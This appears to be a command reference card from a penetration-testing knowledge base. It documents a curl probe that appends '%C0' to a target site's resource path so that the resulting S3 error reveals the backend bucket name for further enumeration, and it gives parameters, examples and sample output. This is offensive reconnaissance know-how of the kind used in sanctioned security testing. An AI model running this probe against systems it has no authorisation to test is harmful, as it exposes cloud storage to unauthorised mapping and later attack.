---
type: command
executor: bash
data: 'curl "http://$_TARGET_DOMAIN/$_RESOURCE_PATH%C0"'
tags:
  - aws
  - s3
  - extraction
  - url-encoding
platforms:
  - Linux
  - macOS
verified: true
validated: true
---

# curl-extract-s3-bucket-name

## Command

```bash
curl "http://$_TARGET_DOMAIN/$_RESOURCE_PATH%C0"
```

## Description

Probes a website's resource path with URL encoding (%C0 acts as a path separator or null terminator) to trigger an S3 error that may reveal the backend bucket name used for storage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_DOMAIN | The domain of the target website (e.g., 'example.com') | Yes |
| $_RESOURCE_PATH | The path to a resource like an image or file (e.g., 'resources/avatar/123') | Yes |

## Examples

### Basic Usage

```bash
curl "http://example.com/resources/id%C0"
```

### Advanced Usage

```bash
curl -v "http://example.com/avatar/123%C0"  # Verbose to see full response headers
```

## Expected Output

Error response revealing S3 details:
```
<Error>
  <Code>NoSuchKey</Code>
  <Message>The specified key does not exist.</Message>
  <Key>resources/id</Key>
  <Bucket>hidden-example-bucket</Bucket>
  <RequestId>ABC123</RequestId>
  <HostId>xyz789</HostId>
</Error>
```
The <Bucket> tag exposes the S3 bucket name for further enumeration.

## Related

- [[procedures/Enumerate-Open-Amazon-S3-Buckets]]
